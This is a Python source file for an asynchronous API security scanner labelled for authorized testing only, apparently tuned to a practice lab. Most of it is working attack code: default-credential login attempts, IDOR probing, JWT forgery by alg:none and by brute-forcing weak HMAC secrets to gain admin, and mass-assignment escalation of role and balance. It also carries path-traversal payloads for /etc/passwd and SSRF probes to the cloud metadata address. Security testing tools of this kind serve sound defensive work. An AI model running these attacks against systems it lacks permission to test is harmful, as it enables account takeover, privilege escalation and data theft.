#!/usr/bin/env python3
"""
advanced_scanner.py — Advanced API Security Scanner
Covers OWASP API Security Top 10 + privilege escalation patterns.
Authorized security testing only.
"""

import argparse
import asyncio
import base64
import json
import re
import sys
import time
from dataclasses import dataclass, field
from typing import Any, Optional
from urllib.parse import urljoin, urlparse, urlencode

try:
    import aiohttp
except ImportError:
    print("pip install aiohttp beautifulsoup4 lxml pyjwt")
    sys.exit(1)

# ── Severity ──────────────────────────────────────────────────────────────

CRIT = "CRITICAL"
HIGH = "HIGH"
MED  = "MEDIUM"
LOW  = "LOW"
INFO = "INFO"

SEV_COLOR = {
    CRIT: "\033[1;35m",
    HIGH: "\033[1;31m",
    MED:  "\033[1;33m",
    LOW:  "\033[1;34m",
    INFO: "\033[0;36m",
}
RESET = "\033[0m"
BOLD  = "\033[1m"


@dataclass
class Finding:
    title: str
    severity: str
    detail: str
    evidence: str = ""
    url: str = ""
    remediation: str = ""


@dataclass
class ScanState:
    base: str
    session: Any
    token_low: Optional[str] = None    # low-priv user JWT
    token_high: Optional[str] = None   # high-priv / admin JWT
    uid_low: int = 0
    uid_high: int = 0
    findings: list[Finding] = field(default_factory=list)
    tested: set[str] = field(default_factory=set)


# ── HTTP helpers ──────────────────────────────────────────────────────────

async def req(
    state: ScanState,
    method: str,
    path: str,
    *,
    token: Optional[str] = None,
    json_body: Any = None,
    params: dict = None,
    headers: dict = None,
    allow_redirects: bool = True,
) -> tuple[int, dict, str]:
    url = urljoin(state.base.rstrip("/") + "/", path.lstrip("/"))
    hdrs = {"User-Agent": "AdvSecScanner/2.0"}
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    if headers:
        hdrs.update(headers)
    try:
        async with state.session.request(
            method, url, json=json_body, params=params,
            headers=hdrs, allow_redirects=allow_redirects, ssl=False,
            timeout=aiohttp.ClientTimeout(total=10),
        ) as resp:
            ct = resp.headers.get("Content-Type", "")
            body = await resp.text(errors="replace")
            try:
                data = json.loads(body)
            except Exception:
                data = {"_raw": body[:500]}
            return resp.status, data, ct
    except Exception as e:
        return 0, {"_error": str(e)}, ""


def flag(state: ScanState, finding: Finding):
    state.findings.append(finding)


# ══════════════════════════════════════════════════════════════════════════
# CHECK MODULES
# ══════════════════════════════════════════════════════════════════════════

# ── 1. Auth / Login ────────────────────────────────────────────────────────

async def check_auth_endpoints(state: ScanState):
    """Probe login, capture tokens for subsequent tests."""
    login_paths = [
        "api/v1/login", "api/v2/login", "api/login", "auth/login",
        "login", "oauth/token", "auth/token", "api/token",
    ]
    for path in login_paths:
        status, data, _ = await req(state, "POST", path,
            json_body={"username": "alice", "password": "any"},
        )
        if status == 200 and "token" in str(data):
            token = data.get("token") or data.get("access_token") or data.get("jwt", "")
            uid = data.get("user_id", 1)
            if not state.token_low:
                state.token_low = token
                state.uid_low = uid
                flag(state, Finding(
                    title="Login succeeded — token captured",
                    severity=INFO,
                    url=path,
                    detail=f"Authenticated as uid={uid}",
                    evidence=f"token={token[:40]}...",
                ))

        # No-password / empty-password check
        for creds in [
            {"username": "admin", "password": ""},
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "admin123"},
        ]:
            s, d, _ = await req(state, "POST", path, json_body=creds)
            if s == 200 and "token" in str(d):
                t = d.get("token") or d.get("access_token", "")
                if not state.token_high:
                    state.token_high = t
                    state.uid_high = d.get("user_id", 3)
                flag(state, Finding(
                    title="Default/weak admin credentials accepted",
                    severity=CRIT,
                    url=path,
                    detail=f"username={creds['username']} password={creds['password']!r}",
                    evidence=f"HTTP 200, token={t[:40]}...",
                    remediation="Enforce strong passwords; remove default accounts.",
                ))


# ── 2. IDOR / BOLA (Broken Object Level Authorization) ────────────────────

async def check_idor(state: ScanState):
    if not state.token_low:
        return

    resource_patterns = [
        ("users/{id}", [1, 2, 3, 99]),
        ("api/v1/users/{id}", [1, 2, 3, 99]),
        ("api/v2/users/{id}", [1, 2, 3]),
        ("api/v1/posts/{id}", [1, 2, 3, 99]),
        ("api/v1/orders/{id}", [1, 2, 3]),
        ("api/v1/accounts/{id}", [1, 2, 3]),
        ("api/v1/invoices/{id}", [1, 2, 3]),
        ("api/v1/files/{id}", [1, 2, 3]),
    ]

    for pattern, ids in resource_patterns:
        results = {}
        for uid in ids:
            path = pattern.replace("{id}", str(uid))
            status, data, _ = await req(state, "GET", path, token=state.token_low)
            results[uid] = (status, data)

        ok_ids = [i for i, (s, _) in results.items() if s == 200]
        if len(ok_ids) > 1:
            sample = results[ok_ids[0]][1]
            has_sensitive = any(
                k in str(sample).lower()
                for k in ("ssn", "password", "secret", "token", "credit", "bank", "private")
            )
            flag(state, Finding(
                title=f"IDOR / BOLA — {pattern}",
                severity=CRIT if has_sensitive else HIGH,
                url=pattern,
                detail=f"Low-priv token accessed IDs: {ok_ids}. Sensitive data: {has_sensitive}",
                evidence=json.dumps(sample)[:300],
                remediation="Enforce object-level ownership checks on every resource read.",
            ))


# ── 3. Broken Function Level Auth (admin endpoints without admin role) ─────

async def check_bfla(state: ScanState):
    admin_patterns = [
        ("GET",    "api/v1/admin/users"),
        ("GET",    "api/v1/admin/config"),
        ("GET",    "api/v1/admin/logs"),
        ("GET",    "api/v1/admin/dashboard"),
        ("DELETE", "api/v1/admin/delete_user/2"),
        ("GET",    "admin/users"),
        ("GET",    "manage/users"),
        ("GET",    "console"),
    ]
    for method, path in admin_patterns:
        # Try with low-priv token
        s, data, _ = await req(state, method, path, token=state.token_low)
        if s == 200:
            flag(state, Finding(
                title=f"BFLA — Admin function accessible to low-priv user",
                severity=CRIT,
                url=path,
                detail=f"{method} {path} → 200 with low-privilege token",
                evidence=json.dumps(data)[:300],
                remediation="Check role/permission on every function, not just authentication.",
            ))
        # Try with NO token
        s2, data2, _ = await req(state, method, path)
        if s2 == 200:
            flag(state, Finding(
                title=f"BFLA — Admin function accessible with NO auth",
                severity=CRIT,
                url=path,
                detail=f"{method} {path} → 200 with zero authentication",
                evidence=json.dumps(data2)[:300],
                remediation="Add authentication + authorization to all admin endpoints.",
            ))


# ── 4. HTTP Verb Tampering ─────────────────────────────────────────────────

async def check_verb_tampering(state: ScanState):
    """Try alternate verbs on endpoints that restrict one method."""
    probe_paths = [
        "api/v1/secret",
        "api/v1/admin/config",
        "api/v1/users/1",
        "api/v1/debug",
        "debug",
    ]
    verbs = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]

    for path in probe_paths:
        baseline_s, _, _ = await req(state, "GET", path)
        if baseline_s not in (401, 403):
            continue  # not restricted

        for verb in verbs:
            if verb == "GET":
                continue
            s, data, _ = await req(state, verb, path,
                                   json_body={"test": 1} if verb in ("POST", "PUT", "PATCH") else None)
            if s not in (401, 403, 405):
                flag(state, Finding(
                    title=f"HTTP Verb Tampering — {verb} bypasses restriction on {path}",
                    severity=HIGH,
                    url=path,
                    detail=f"GET → {baseline_s}, {verb} → {s}",
                    evidence=json.dumps(data)[:200],
                    remediation="Apply auth/authz checks at the route handler, not the HTTP method.",
                ))


# ── 5. JWT Attacks ────────────────────────────────────────────────────────

def b64decode_nopad(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64encode_nopad(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge_jwt_alg_none(token: str) -> Optional[str]:
    """Strip signature and set alg:none."""
    try:
        parts = token.split(".")
        header = json.loads(b64decode_nopad(parts[0]))
        header["alg"] = "none"
        new_header = b64encode_nopad(json.dumps(header, separators=(",", ":")).encode())
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


def forge_jwt_role_escalation(token: str, new_role: str = "admin") -> dict[str, str]:
    """Produce forged tokens with escalated role using common weak secrets."""
    try:
        import hmac
        import hashlib

        parts = token.split(".")
        payload = json.loads(b64decode_nopad(parts[1]))
        original_role = payload.get("role", "user")
        payload["role"] = new_role
        payload["sub"] = "3"  # admin uid in sandbox

        header = json.loads(b64decode_nopad(parts[0]))
        header_enc = b64encode_nopad(json.dumps(header, separators=(",", ":")).encode())
        payload_enc = b64encode_nopad(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{header_enc}.{payload_enc}".encode()

        weak_secrets = [
            "secret", "secret123", "password", "jwt_secret",
            "supersecret", "changeme", "12345678", "qwerty",
            "letmein", "admin", "mysecret", "token",
        ]
        forged: dict[str, str] = {}
        for sec in weak_secrets:
            sig = hmac.new(sec.encode(), signing_input, hashlib.sha256).digest()
            sig_enc = b64encode_nopad(sig)
            forged[sec] = f"{header_enc}.{payload_enc}.{sig_enc}"

        return forged
    except Exception:
        return {}


async def check_jwt_attacks(state: ScanState):
    if not state.token_low:
        return

    token = state.token_low

    # Decode and inspect
    try:
        parts = token.split(".")
        header  = json.loads(b64decode_nopad(parts[0]))
        payload = json.loads(b64decode_nopad(parts[1]))
    except Exception:
        return

    # Short / weak secret warning
    alg = header.get("alg", "")
    if alg in ("HS256", "HS384", "HS512"):
        flag(state, Finding(
            title="JWT uses symmetric HMAC — weak-secret bruteforce possible",
            severity=MED,
            url="token analysis",
            detail=f"alg={alg}, claims={payload}",
            evidence=f"header={header}",
            remediation="Use RS256/ES256. Ensure HMAC secret is ≥256 bits of entropy.",
        ))

    # alg:none attack
    none_token = forge_jwt_alg_none(token)
    if none_token:
        for path in ["api/v1/whoami", "api/v1/users/1", "api/v1/admin/users"]:
            s, data, _ = await req(state, "GET", path, token=none_token)
            if s == 200:
                flag(state, Finding(
                    title="JWT alg:none accepted — signature not verified",
                    severity=CRIT,
                    url=path,
                    detail="Server accepted token with alg=none and empty signature",
                    evidence=json.dumps(data)[:200],
                    remediation="Reject tokens with alg:none. Whitelist allowed algorithms server-side.",
                ))
                break

    # Weak secret bruteforce → role escalation
    forged = forge_jwt_role_escalation(token, "admin")
    for secret, forged_token in forged.items():
        for path in ["api/v1/admin/users", "api/v1/users/3"]:
            s, data, _ = await req(state, "GET", path, token=forged_token)
            if s == 200 and "admin" in str(data).lower():
                flag(state, Finding(
                    title=f"JWT weak secret — role escalated to admin via secret='{secret}'",
                    severity=CRIT,
                    url=path,
                    detail=f"Forged token accepted. Gained admin access using secret={secret!r}",
                    evidence=json.dumps(data)[:300],
                    remediation="Use a cryptographically random secret of ≥256 bits.",
                ))
                state.token_high = forged_token
                break


# ── 6. Mass Assignment ────────────────────────────────────────────────────

async def check_mass_assignment(state: ScanState):
    if not state.token_low:
        return

    # Try to escalate own role / balance via PUT
    priv_fields = [
        {"role": "admin"},
        {"balance": 999999},
        {"is_admin": True},
        {"admin": True},
        {"role": "admin", "balance": 999999},
    ]

    paths = [
        f"api/v1/users/{state.uid_low}",
        f"api/v1/profile",
        f"api/v1/me",
    ]

    for path in paths:
        # Baseline
        s0, before, _ = await req(state, "GET", path, token=state.token_low)
        if s0 != 200:
            continue

        for payload in priv_fields:
            s, after, _ = await req(state, "PUT", path,
                                    token=state.token_low, json_body=payload)
            if s == 200:
                for k, v in payload.items():
                    if str(after.get(k)) == str(v) or str(v) in str(after):
                        flag(state, Finding(
                            title=f"Mass Assignment — elevated '{k}' to {v!r}",
                            severity=CRIT,
                            url=path,
                            detail=f"PUT with {payload} → field accepted in response",
                            evidence=json.dumps(after)[:300],
                            remediation="Use an allowlist of user-editable fields. Never blindly merge request body.",
                        ))


# ── 7. CORS Misconfiguration ──────────────────────────────────────────────

async def check_cors(state: ScanState):
    evil_origins = [
        "https://evil.com",
        "null",
        "https://attacker.example.com",
        f"https://evil-{urlparse(state.base).netloc}",
    ]

    for origin in evil_origins:
        s, _, ct = await req(state, "GET", "api/v1/health",
                             headers={"Origin": origin},
                             token=state.token_low)
        # We need the raw headers — do a direct request
        url = urljoin(state.base.rstrip("/") + "/", "api/v1/health")
        try:
            async with state.session.get(
                url,
                headers={"Origin": origin, "User-Agent": "AdvSecScanner/2.0"},
                ssl=False,
            ) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "false")

                if acao == origin and acac.lower() == "true":
                    flag(state, Finding(
                        title="CORS — Arbitrary origin reflected with credentials allowed",
                        severity=CRIT,
                        url="api/v1/health",
                        detail=f"Origin: {origin} → ACAO: {acao}, ACAC: {acac}",
                        evidence=f"Attacker can make credentialed cross-origin requests from {origin}",
                        remediation="Maintain an explicit origin allowlist. Never reflect arbitrary origins with ACAC:true.",
                    ))
                    break
                elif acao == "*" and acac.lower() == "true":
                    flag(state, Finding(
                        title="CORS — Wildcard origin with credentials (browser-rejected but misconfigured)",
                        severity=MED,
                        url="api/v1/health",
                        detail=f"ACAO: *, ACAC: true",
                        remediation="Wildcard ACAO cannot coexist with ACAC:true per spec. Fix origin allowlist.",
                    ))
                elif acao == "null":
                    flag(state, Finding(
                        title="CORS — null origin allowed (sandbox iframe bypass)",
                        severity=HIGH,
                        url="api/v1/health",
                        detail="null origin accepted — exploitable via sandboxed iframe",
                        remediation="Never allow null origin in production.",
                    ))
        except Exception:
            pass


# ── 8. Sensitive File / Info Disclosure ──────────────────────────────────

SENSITIVE_PATHS = [
    (".env", CRIT),
    (".env.local", CRIT),
    (".env.production", CRIT),
    ("config.json", HIGH),
    ("appsettings.json", HIGH),
    ("secrets.json", CRIT),
    ("database.yml", HIGH),
    (".git/config", HIGH),
    (".git/HEAD", MED),
    ("debug", HIGH),
    ("api/v1/swagger.json", INFO),
    ("api/v1/health", INFO),
    ("actuator/env", CRIT),
    ("actuator/heapdump", CRIT),
    ("phpinfo.php", MED),
    ("server-status", MED),
    ("web.config", HIGH),
    ("backup.sql", CRIT),
    ("dump.sql", CRIT),
]

SENSITIVE_KEYWORDS = re.compile(
    r"(password|passwd|secret|api[_\-]key|aws[_\-]?key|private[_\-]?key"
    r"|token|jwt[_\-]?secret|db[_\-]?pass|database_url|ssn|credit.card"
    r"|BEGIN (RSA|EC|OPENSSH) PRIVATE)",
    re.IGNORECASE,
)


async def check_sensitive_files(state: ScanState):
    for path, base_sev in SENSITIVE_PATHS:
        s, data, ct = await req(state, "GET", path)
        if s == 200:
            raw = json.dumps(data) if isinstance(data, dict) else data.get("_raw", "")
            has_secrets = bool(SENSITIVE_KEYWORDS.search(raw))
            sev = CRIT if has_secrets else base_sev

            flag(state, Finding(
                title=f"Sensitive file/endpoint exposed — {path}",
                severity=sev,
                url=path,
                detail=f"HTTP {s}. Contains credential patterns: {has_secrets}",
                evidence=raw[:300],
                remediation="Remove debug/config endpoints from production. Protect with auth + network controls.",
            ))


# ── 9. Path Traversal ─────────────────────────────────────────────────────

async def check_path_traversal(state: ScanState):
    if not state.token_low:
        return

    # Paths that take a filename/resource parameter
    base_paths = [
        "api/v1/files/{}",
        "api/v1/download/{}",
        "api/v1/read/{}",
        "static/{}",
    ]
    traversal_payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2F..%2Fetc%2Fpasswd",
        "../../config.env",
        "../passwords.txt",
        "passwords.txt",
        "config.env",
    ]

    for pattern in base_paths:
        for payload in traversal_payloads:
            path = pattern.format(payload)
            s, data, _ = await req(state, "GET", path, token=state.token_low)
            raw = json.dumps(data)
            if s == 200 and (
                "root:" in raw
                or "password" in raw.lower()
                or "DB_PASS" in raw
                or "aws" in raw.lower()
            ):
                flag(state, Finding(
                    title=f"Path Traversal — {pattern.format('...')}",
                    severity=CRIT,
                    url=path,
                    detail=f"Payload {payload!r} → HTTP {s}",
                    evidence=raw[:300],
                    remediation="Resolve canonical path and assert it starts with the intended base directory.",
                ))
                break


# ── 10. SSRF Detection ────────────────────────────────────────────────────

async def check_ssrf(state: ScanState):
    if not state.token_low:
        return

    ssrf_params = ["url", "redirect", "next", "target", "dest", "callback",
                   "endpoint", "webhook", "fetch", "load", "src", "uri"]
    internal_urls = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://10.0.0.1/",
    ]

    probe_paths = [
        "api/v1/fetch",
        "api/v1/proxy",
        "api/v1/webhook",
        "webhook",
        "proxy",
    ]

    for path in probe_paths:
        for url_val in internal_urls:
            for param in ssrf_params:
                s, data, _ = await req(state, "GET", path,
                                       params={param: url_val},
                                       token=state.token_low)
                raw = json.dumps(data)
                if s == 200 and ("internal" in raw.lower() or "localhost" in raw.lower()
                                 or "simulated" in raw.lower() or url_val in raw):
                    flag(state, Finding(
                        title=f"SSRF — {path} fetches internal URL via ?{param}=",
                        severity=CRIT,
                        url=f"{path}?{param}={url_val}",
                        detail=f"Server reached internal resource: {url_val}",
                        evidence=raw[:300],
                        remediation="Block internal IP ranges server-side. Use an allowlist of permitted external domains.",
                    ))
                    return  # one finding is enough


# ── 11. GraphQL Introspection ─────────────────────────────────────────────

GRAPHQL_INTROSPECTION = """
{
  __schema {
    types {
      name
      fields {
        name
        args { name type { name kind } }
      }
    }
  }
}
"""

GRAPHQL_SECRET_QUERY = """
{ secretFlag }
"""

GRAPHQL_IDOR = """
{ user(id: 3) { id username email role ssn balance } }
"""


async def check_graphql(state: ScanState):
    gql_paths = ["graphql", "api/graphql", "v1/graphql", "query", "gql"]
    for path in gql_paths:
        # Introspection
        s, data, _ = await req(state, "POST", path,
                               json_body={"query": GRAPHQL_INTROSPECTION})
        if s == 200 and "types" in str(data):
            types = data.get("data", {}).get("__schema", {}).get("types", [])
            type_names = [t.get("name") for t in types if t.get("name")]
            flag(state, Finding(
                title=f"GraphQL introspection enabled — full schema exposed",
                severity=HIGH,
                url=path,
                detail=f"Discovered types: {type_names[:10]}",
                evidence=json.dumps(data)[:400],
                remediation="Disable introspection in production environments.",
            ))

            # Try to extract sensitive data
            s2, data2, _ = await req(state, "POST", path,
                                     json_body={"query": GRAPHQL_SECRET_QUERY})
            if s2 == 200 and "FLAG" in str(data2):
                flag(state, Finding(
                    title="GraphQL — Secret data accessible without auth",
                    severity=CRIT,
                    url=path,
                    detail="Queried secretFlag without authentication",
                    evidence=json.dumps(data2)[:200],
                    remediation="Apply field-level authorization. Audit all resolvers.",
                ))

            # IDOR via GraphQL
            s3, data3, _ = await req(state, "POST", path,
                                     json_body={"query": GRAPHQL_IDOR})
            if s3 == 200 and "admin" in str(data3).lower():
                flag(state, Finding(
                    title="GraphQL IDOR — accessing other users' data",
                    severity=CRIT,
                    url=path,
                    detail="Fetched admin user (id=3) including SSN/role without auth",
                    evidence=json.dumps(data3)[:300],
                    remediation="Apply object-level auth in every GraphQL resolver.",
                ))
            break


# ── 12. Security Headers ──────────────────────────────────────────────────

async def check_security_headers(state: ScanState):
    url = state.base
    try:
        async with state.session.get(url, ssl=False) as resp:
            headers = dict(resp.headers)
            missing = []
            weak = []

            checks = {
                "X-Content-Type-Options": lambda v: v.lower() == "nosniff",
                "X-Frame-Options": lambda v: v.upper() in ("DENY", "SAMEORIGIN"),
                "Strict-Transport-Security": lambda v: "max-age" in v.lower(),
                "Content-Security-Policy": lambda v: bool(v),
                "Referrer-Policy": lambda v: bool(v),
                "Permissions-Policy": lambda v: bool(v),
            }

            for h, validator in checks.items():
                val = headers.get(h, "")
                if not val:
                    missing.append(h)
                elif not validator(val):
                    weak.append(f"{h}: {val}")

            if missing:
                flag(state, Finding(
                    title="Missing security headers",
                    severity=MED,
                    url=state.base,
                    detail=f"Absent: {', '.join(missing)}",
                    remediation="Add standard security headers in server/middleware configuration.",
                ))
            if weak:
                flag(state, Finding(
                    title="Weak security header values",
                    severity=LOW,
                    url=state.base,
                    detail=f"Misconfigured: {', '.join(weak)}",
                ))
    except Exception:
        pass


# ── 13. Parameter Pollution ───────────────────────────────────────────────

async def check_param_pollution(state: ScanState):
    if not state.token_low:
        return
    # Duplicate params to confuse server-side parsing
    s, data, _ = await req(state, "GET", "api/v1/users/1",
                           params={"id": ["1", "3"]},
                           token=state.token_low)
    if s == 200 and "admin" in str(data).lower():
        flag(state, Finding(
            title="HTTP Parameter Pollution — second id= value used",
            severity=HIGH,
            url="api/v1/users/1?id=1&id=3",
            detail="Duplicate query param caused server to use second value (id=3 → admin)",
            evidence=json.dumps(data)[:200],
            remediation="Enforce single parameter values. Validate path params against query params.",
        ))


# ══════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════

CHECKS = [
    ("Auth & token capture",           check_auth_endpoints),
    ("IDOR / BOLA",                    check_idor),
    ("Broken Function Level Auth",     check_bfla),
    ("HTTP Verb Tampering",            check_verb_tampering),
    ("JWT Attacks",                    check_jwt_attacks),
    ("Mass Assignment",                check_mass_assignment),
    ("CORS Misconfiguration",          check_cors),
    ("Sensitive File Disclosure",      check_sensitive_files),
    ("Path Traversal",                 check_path_traversal),
    ("SSRF",                           check_ssrf),
    ("GraphQL Introspection & IDOR",   check_graphql),
    ("Security Headers",               check_security_headers),
    ("Parameter Pollution",            check_param_pollution),
]


async def run_scan(base: str, verbose: bool = False) -> list[Finding]:
    connector = aiohttp.TCPConnector(ssl=False, limit=20)
    async with aiohttp.ClientSession(connector=connector) as session:
        state = ScanState(base=base, session=session)
        for name, fn in CHECKS:
            if verbose:
                print(f"  → {name}...")
            try:
                await fn(state)
            except Exception as e:
                if verbose:
                    print(f"    ERROR: {e}")
        return state.findings


# ── Reporting ─────────────────────────────────────────────────────────────

SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}
SEV_ICONS = {CRIT: "💀", HIGH: "🔴", MED: "🟡", LOW: "🔵", INFO: "ℹ️ "}


def print_report(findings: list[Finding], elapsed: float, no_color: bool = False):
    if no_color:
        global SEV_COLOR, RESET, BOLD
        SEV_COLOR = {k: "" for k in SEV_COLOR}
        RESET = BOLD = ""

    findings = sorted(findings, key=lambda f: SEV_ORDER.get(f.severity, 9))
    counts = {s: sum(1 for f in findings if f.severity == s) for s in SEV_ORDER}

    print(f"\n{'═'*65}")
    print(f"{BOLD}  ADVANCED SECURITY SCAN REPORT{RESET}")
    print(f"{'═'*65}")
    print(f"  Elapsed : {elapsed:.1f}s")
    print(f"  Findings: {BOLD}{len(findings)}{RESET}   "
          + "  ".join(f"{SEV_COLOR[s]}{s}: {counts[s]}{RESET}" for s in SEV_ORDER if counts[s]))
    print(f"{'═'*65}\n")

    for i, f in enumerate(findings, 1):
        c = SEV_COLOR.get(f.severity, "")
        icon = SEV_ICONS.get(f.severity, "")
        print(f"  [{i:02d}] {c}{BOLD}{f.severity:8s}{RESET}  {icon}  {BOLD}{f.title}{RESET}")
        if f.url:
            print(f"         URL      : {f.url}")
        print(f"         Detail   : {f.detail}")
        if f.evidence:
            snippet = f.evidence[:120].replace("\n", " ")
            print(f"         Evidence : {snippet}")
        if f.remediation:
            print(f"         Fix      : {f.remediation}")
        print()

    print(f"{'═'*65}")


def save_json(findings: list[Finding], path: str, elapsed: float):
    data = {
        "elapsed": round(elapsed, 2),
        "total": len(findings),
        "findings": [
            {
                "severity": f.severity,
                "title": f.title,
                "url": f.url,
                "detail": f.detail,
                "evidence": f.evidence[:300],
                "remediation": f.remediation,
            }
            for f in findings
        ],
    }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    print(f"\n  Report saved → {path}\n")


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        prog="advanced_scanner",
        description="Advanced API security scanner — authorized testing only.",
    )
    p.add_argument("url", help="Target base URL")
    p.add_argument("-v", "--verbose", action="store_true", help="Show check names as they run")
    p.add_argument("-o", "--output", metavar="FILE", help="Save JSON report")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args()

    parsed = urlparse(args.url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        print(f"Invalid URL: {args.url}")
        sys.exit(1)

    print(
        "\n⚠  AUTHORIZED USE ONLY — only run against targets you own"
        "\n   or have explicit written permission to test.\n"
    )

    start = time.monotonic()
    findings = asyncio.run(run_scan(args.url, verbose=args.verbose))
    elapsed = time.monotonic() - start

    print_report(findings, elapsed, no_color=args.no_color)

    if args.output:
        save_json(findings, args.output, elapsed)


if __name__ == "__main__":
    main()
